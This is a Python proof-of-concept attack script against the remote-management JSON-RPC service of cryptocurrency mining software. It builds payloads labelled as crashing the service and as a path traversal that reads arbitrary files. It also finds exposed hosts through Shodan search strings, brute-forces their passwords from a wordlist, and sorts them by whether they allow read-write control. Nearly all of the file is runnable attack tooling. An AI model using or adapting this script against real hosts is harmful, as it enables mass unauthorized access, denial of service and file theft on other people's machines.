#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# github.com/tintinweb
#

import logging
import json
import time
import argparse
import socket
import requests
import re

try:
    import socks
except ImportError:
    print "!! cannot import socks. no socks support!"
    socks = None
try:
    import shodan
except ImportError:
    print "!! cannot import shodan. no shodan support!"
    shodan = None

LOGGER = logging.getLogger(__name__)

class MinerRpc(object):
    """
    Generic MinerRpc class with socks support
    """

    def __init__(self):
        self.sock = None

    def connect(self, host, port, proxy=None, timeout=4):
        if socks:
            self.sock = socks.socksocket()
        else:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(timeout)
        if proxy:
            if not socks:
                raise Exception("socks support disabled due to unmet dependency. please install pysocks")
            self.sock.set_proxy(*proxy)
        return self.sock.connect((host, port))

    def sendRcv(self, msg, chunksize=4096):
        self.sock.send(msg)
        chunks = []
        chunk = None
        #time.sleep(2)
        while chunk is None or len(chunk)==chunksize:
            chunk = self.sock.recv(chunksize)
            chunks.append(chunk)
        return "".join(chunks)

    def sendRcvTimed(self, msg, chunksize=1):
        self.sock.sendall(msg)
        start = time.time()
        resp = self.sock.recv(chunksize)
        diff = time.time()-start
        return diff, resp


class Utils:
    """
    Utility namespace
    """

    @staticmethod
    def iter_targets(targets, shodan_apikey):
        shodan_api = None
        if not shodan:
            LOGGER.warning(
                "[i] starting without shodan support. please pip install shodan to use shodan search strings.")
        else:
            if not shodan_apikey:
                LOGGER.warning("shodan apikey missing! shodan support disabled.")
            else:
                shodan_api = shodan.Shodan(shodan_apikey)

        for target in targets:
            if target.startswith("shodan://"):
                target = target.replace("shodan://", "")
                if shodan_api:
                    result = shodan_api.search(target)
                    print 'Total Results: %s\n' % result['total']
                    for t in result['matches']:
                        yield t['ip_str'], t['port']
            else:
                host,port = target.strip().split(":")
                yield host,int(port)


VECTORS = {
    # Vector: extrafield
    # Description: overly long value for field. overly long overall msg
    # Result: crashes always, even though
    #   * password required
    #   * readonly mode (-<port>)
    "stat" : {"id": 0,
                     "jsonrpc": "2.0",
                     "method": "miner_getstat1",
                     "psw": "default", },
    # Vector: psw (basically same as extrafield)
    # Description: overly long value for psw. overly long overall msg
    # Result: crashes always, even though
    #   * password required
    #   * readonly mode (-<port>)
    "control" : { "id": 1,
              "jsonrpc": "2.0",
              "method": "control_gpu", },
    # Vector: method
    # Description: overly long value for field. overly long overall msg
    # Result: crashes always, even though
    #   * readonly mode (-<port>)
    "restart" : {"id": 1,
                     "jsonrpc": "2.0",
                     "method": "miner_restart"},  ##<<--
    # Vector: traversal
    # Description: path traversal
    # Result: retrieves any file
    "getfile": {"id":0,
             "jsonrpc":"2.0",
             "method":"miner_getfile",
             "params":["config.txt"],
             "psw":"default"}, ##<<-- adjust path


}

if __name__ == "__main__":
    logging.basicConfig(format='[%(filename)s - %(funcName)20s() ][%(levelname)8s] %(message)s',
                        loglevel=logging.DEBUG)
    LOGGER.setLevel(logging.DEBUG)

    usage = """poc.py [options]

                  example: poc.py [options] <target> [<target>, ...]

                  options:
                           apikey       ... optional shodan apikey
                           vector       ... method ... overflow in method, requires password if set [readonly]
                                            extrafield  ... overflow in non-standard field [readonly, passwd mode]
                                            psw ... overflow in password
                                            traversal ... relative path traversal [authenticated]

                  target   ... IP, FQDN or shodan://<search string>

                           #> poc.py 1.1.1.1
                           #> poc.py 1.2.3.4 "shodan://product:eth+result"
               """

    parser = argparse.ArgumentParser(usage=usage)
    parser.add_argument("-a", "--apikey",
                        dest="apikey", default=None,
                        help="shodan.io apikey, NotSet=disabled [default: None]")
    parser.add_argument("-m", "--vector",
                        dest="vector", default="control",
                        help="vulnerablevectors [default: method]")
    parser.add_argument("-f", "--file",
                        dest="filename", default=None,
                        help="passwords file [default: method]")
    parser.add_argument("targets", nargs="+")

    options = parser.parse_args()
    LOGGER.info("--start--")
    m = MinerRpc()
    p = re.compile("(ETH - Total Speed: .* Mh/s)")
#    if options.filename:
#        pfile = open(options.filename,"r")
    for ip, port in Utils.iter_targets(options.targets, options.apikey):
        #LOGGER.info("[i] Target: %s:%s"%(ip, port))

            #LOGGER.info("[+] connected.")
            if options.filename:
                counter = 0
                with open(options.filename) as infile:
                    for password in infile:
                       counter += 1
                       try:
                           m.connect(ip, port, timeout=5)
                           VECTORS[options.vector]["psw"] = password.rstrip()
                           resp = m.sendRcv(json.dumps(VECTORS[options.vector]))
                           if counter % 1000 == 0:
                               print("Passwords checked: " + str(counter))
                           if len(resp) > 2:
                                LOGGER.info("[++] Password was accepted: " + str(password.rstrip()) + " for " + str(ip) + ":" + str(port))
                                print("Passwords checked: " + str(counter))
                       except socket.error, e:
                           continue
                print("Passwords checked: " + str(counter))
                LOGGER.info("[--] password not found")

            if options.vector == "control":
                try:
                    m.connect(ip, port, timeout=4)
                    resp = m.sendRcv(json.dumps(VECTORS[options.vector]))  # crash with readonly mode
                except socket.error, e:
                    continue
                if not len(resp):
                    r = requests.get("http://" + str(ip) + ":" + str(port))
                    resp = r.text
                    match = p.search(resp)    # The result of this is referenced by variable name '_'
                    if match:
                        print (match.group(1))     # group(1) will return the 1st capture.
                if "Remote management: read-only mode" not in resp:
                    if "no password found in request" in resp:
                        LOGGER.info("[+] password protected target: " + str(ip) + ":" + str(port))
                    else:
                        LOGGER.info("[++] RW target: " + str(ip) + ":" + str(port))
                else:
                    LOGGER.info("[-] RO target: " + str(ip) + ":" + str(port))

    LOGGER.info("--done--")
